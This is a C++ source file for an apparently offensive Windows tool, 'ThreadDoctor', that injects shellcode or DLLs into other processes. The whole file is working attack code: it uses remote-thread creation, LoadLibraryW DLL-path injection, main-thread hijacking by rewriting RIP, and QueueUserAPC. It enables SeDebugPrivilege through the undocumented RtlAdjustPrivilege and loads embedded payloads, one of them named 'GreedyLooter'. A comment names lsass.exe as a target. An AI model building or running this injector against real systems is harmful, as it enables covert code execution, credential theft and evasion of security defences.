#include <Windows.h>
#include <TlHelp32.h>
#include <string>
#include <iostream>
#include <SubAuth.h>
#include <tuple>
#include "resource.h"

#define SE_DEBUG_PRIVILEGE 20

//TODO:
// - Implement Error Checking
// - add x86 payloads
// - Implement PAGE_EXECUTE_READWRITE trigger bypass with VirtualProctectEx
// - Various APC
// - memory map

enum class InjType { None, RemoteThread, DLLPath, ThreadHijack, QueueAPC};
enum class Payload { None, Calculator, Commandline, GreedyLooter};

// get Process ID by process name
DWORD getPID(LPCWSTR procName) {

	// take snapshot of current process
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
	DWORD processId = NULL;

	// grab lsass.exe PID
	if (Process32First(snapshot, &entry) != TRUE) return NULL; // Check if snapshot has process information
	while (Process32Next(snapshot, &entry) == TRUE) {
		if (_wcsicmp(entry.szExeFile, procName) == 0) {  
			processId = entry.th32ProcessID;
		}
	}
    CloseHandle(snapshot);

	return processId;
}

// inject the dllpath into the remote process, then start a remote thread calling LoadLibrary on dllPath
BOOL dllPathInject(DWORD processId, LPCWSTR dllPath) {
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

	// Allocate Buffer for dllPath in remote process
	LPVOID rBuffer = VirtualAllocEx(hProcess, NULL, (wcslen(dllPath) + 1) * sizeof(WCHAR), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	// Write dllPath to remote buffer
	BOOL cWrite = WriteProcessMemory(hProcess, rBuffer, (LPCVOID)dllPath, (wcslen(dllPath) + 1) * sizeof(WCHAR), NULL);
	// retrieve address of LoadLibraryW function from Kernel32.dll
	FARPROC addressLoadLibraryW = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryW");
	// create a thread in the remote process that starts execution with LoadLibraryW(rBuffer) in Kernel32.dll
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addressLoadLibraryW, rBuffer, 0, NULL);

	// //check exitcode from remote thread
	//WaitForSingleObject(hThread, INFINITE);
	//DWORD exitCode;
	//GetExitCodeThread(hThread, &exitCode);

	CloseHandle(hThread);
	CloseHandle(hProcess);
	
	return true;
}

// boolean ref: https://devblogs.microsoft.com/oldnewthing/20041222-00/?p=36923
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

// Runtime libraries enable privileges, native api method of changing privileges (undocumented ntdll function)
// returns previous debug privilege state
NTSTATUS setRtlSEDebug() {
	BOOLEAN bPreviousPrivilegeStatus = FALSE; 
    NTSTATUS status = RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &bPreviousPrivilegeStatus);
	return status;
}


// inject shellcode into remote process then start remote thread calling shellcode
BOOL createRemoteThreadInject(DWORD processId, HGLOBAL shellcode, const size_t shellcodeSize) {
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

	// Allocate Buffer for shellcode in remote process
	LPVOID rBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	// Write shellcode to remote buffer
	BOOL cWrite = WriteProcessMemory(hProcess, rBuffer, (LPCVOID)shellcode, shellcodeSize, NULL);

	// create a thread in the remote process that starts execution on shellcode
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, NULL);

	return true;
}

// returns main thread of process
HANDLE getThread(DWORD pid) {
	THREADENTRY32 threadEntry;
	// needed for Thread32First function to iterate
	threadEntry.dwSize = sizeof(THREADENTRY32);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	Thread32First(snapshot, &threadEntry);
	while (Thread32Next(snapshot, &threadEntry)) {
		if (threadEntry.th32OwnerProcessID == pid) {
			return OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
		}
	}
	return NULL;
}

// (x64) Hijack remote processes main thread, Suspend-Inject-Resume (SIR)
BOOL threadHijackInject(DWORD processId, HGLOBAL shellcode, const size_t shellcodeSize) {
	HANDLE hProcess, mainThread;
	LPVOID rBuffer;
	BOOL bStatus;
	DWORD status;
	CONTEXT context;
	// get all registers in thread context
	context.ContextFlags = CONTEXT_FULL;

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

	// Allocate Buffer for shellcode in remote process
	rBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	// Write shellcode to remote buffer
	bStatus = WriteProcessMemory(hProcess, rBuffer, (LPCVOID)shellcode, shellcodeSize, NULL);

	// get main thread of target process
	mainThread = getThread(processId);

	// suspend target process
	status = SuspendThread(mainThread);

	// get thread context
	bStatus = GetThreadContext(mainThread, &context);
	// set new RIP (Instruction Pointer) address
	context.Rip = (DWORD_PTR)rBuffer;
	// set new thread context
	bStatus = SetThreadContext(mainThread, &context);

	// resume suspended thread
	status = ResumeThread(mainThread);

	return true;
}

// Queue an APC call to shellcode for each thread in process
// Thread in which the APC was queued needs to be or enter into an alertable state to run (SleepEx, SignalObjectAndWait, MsgWaitForMultipleObjectsEx, WaitForMultipleObjectsEx, or WaitForSingleObjectEx)
BOOL queueAPCInject(DWORD processId, HGLOBAL shellcode, const size_t shellcodeSize) {
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

	// Allocate Buffer for shellcode in remote process
	LPVOID rBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	// cast shellcode address to PThread routine
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)rBuffer;
	// Write shellcode to remote buffer
	BOOL cWrite = WriteProcessMemory(hProcess, rBuffer, (LPCVOID)shellcode, shellcodeSize, NULL);

	THREADENTRY32 threadEntry;
	// needed for Thread32First function to iterate
	threadEntry.dwSize = sizeof(THREADENTRY32);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	// for every thread in snapshot that belongs to process, queue APC
	for (Thread32First(snapshot, &threadEntry); Thread32Next(snapshot, &threadEntry);) {
		if (threadEntry.th32OwnerProcessID == processId) {
			 HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
			 QueueUserAPC((PAPCFUNC)apcRoutine, hThread, NULL);
		}
	}

	return true;
}
// Shellcode resources used in shellcodeInject
// Import payload resource:
// https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
std::tuple<HGLOBAL,DWORD> getPayload(Payload payload) {
	HRSRC shellcodeResource;
	switch (payload) {
	case Payload::Calculator:
		shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_CALC1), L"CALC");
		break;
	case Payload::Commandline:
		shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_CMD1), L"CMD");
		break;
	case Payload::GreedyLooter:
		shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_GREEDYLOOTER1), L"GREEDYLOOTER");
		break;
	default:
		wprintf(L"[!] Invalid payload %d", payload);
		exit(1);
	}
	if (shellcodeResource == NULL) {
		wprintf(L"[!] Payload resource not found");
		exit(1);
	}

	// if shellcode is literal must be unsigned char type
	// const unsigned char* literals have a max size of 65535
	HGLOBAL cShellcode = LoadResource(NULL, shellcodeResource);
	DWORD cShellcodeSize = SizeofResource(NULL, shellcodeResource);
	return { cShellcode,cShellcodeSize };
}

// prints commandline usage
int printUsage() {
	wprintf(L"Usage: ThreadDoctor.exe <-t Injection-Type> <-p Payload> [-f DLLPath] {-n ProcessName|-d ProcessID}\n");
	wprintf(L"  -t <type>          Injection type (1: RemoteThread, 2: DLLPath, 3: ThreadHijack, 4: QueueAPC)\n");
	wprintf(L"  -p <payload>       x64 payload to use (1: Calculator, 2: Commandline, 2: GreedyLooter)\n");
	wprintf(L"  -n <PID>           PID of target process\n");
	wprintf(L"  -d <proc-name>     target process name\n");
	wprintf(L"  -f <DLL Path>      Path of DLL file, *Required* for DLLPath injection\n");
	return 0;
}

int wmain(int argc, wchar_t *argv[])
{
	// commandline Argument parser spaghetti (could use cxxopts or Boost.Program_Options)
	DWORD processId = -1;
	InjType type = InjType::None;
	Payload payload = Payload::None;
	LPCWSTR dllPath = L"";
	if (argc <= 1) {
		printUsage();
		exit(1);
	}
	for (int i = 1; i < argc; i++) {
		if (!wcscmp(argv[i], L"-h") || !wcscmp(argv[i], L"--help")) {
			printUsage();
			exit(0);
		}
		else if (!wcscmp(argv[i], L"-d")) {
			processId = _wtoi(argv[i + 1]);
			i++;
		}
		else if (!wcscmp(argv[i], L"-n")) {
			processId = getPID(argv[i + 1]);
			i++;
		}
		else if(!wcscmp(argv[i],L"-t")){
			type = static_cast<InjType>(_wtoi(argv[i + 1]));
			i++;
		}
		else if(!wcscmp(argv[i],L"-p")){
			payload = static_cast<Payload>(_wtoi(argv[i + 1]));
			i++;
		}
		else if(!wcscmp(argv[i],L"-f")){
			dllPath = argv[i+1];
			i++;
		}
		else {
			wprintf(L"[!] Bad argument %s", argv[i]);
			exit(1);
		}
	}
	if (processId == -1 || type == InjType::None) {
		printUsage();
		exit(1);
	}
	if (processId <= 0 || processId == NULL) {
		wprintf(L"[!] Process name not found");
		exit(1);
	}

	// set debug privileges
	NTSTATUS status = setRtlSEDebug();
	if (!NT_SUCCESS(status) || status == 0x00000061) {
		wprintf(L"[!] Enable RtlAdjustPrivilege failed");
		exit(1);
	}

	// Injection type cases
	switch (type) {
	case InjType::RemoteThread:
	{
		std::tuple<HGLOBAL,DWORD> shellcode = getPayload(payload);
		createRemoteThreadInject(processId, std::get<0>(shellcode), std::get<1>(shellcode));
		break;
	}
	case InjType::DLLPath:
	{
		// dllpath injection argument check
		if (type == InjType::DLLPath && (lstrcmpW(dllPath, L"") == 0)) {
			wprintf(L"[!] DLL path needed for dll path injection");
			exit(1);
		}

		dllPathInject(processId, dllPath);
		break;
	}
	case InjType::ThreadHijack:
	{
		std::tuple<HGLOBAL,DWORD> shellcode = getPayload(payload);
		threadHijackInject(processId, std::get<0>(shellcode), std::get<1>(shellcode));
		break;
	}
	case InjType::QueueAPC:
	{
		std::tuple<HGLOBAL,DWORD> shellcode = getPayload(payload);
		queueAPCInject(processId, std::get<0>(shellcode), std::get<1>(shellcode));
		break;
	}
	default:
		wprintf(L"[!] Invalid injection type %d", type);
		exit(1);
	}

	return 0;
}
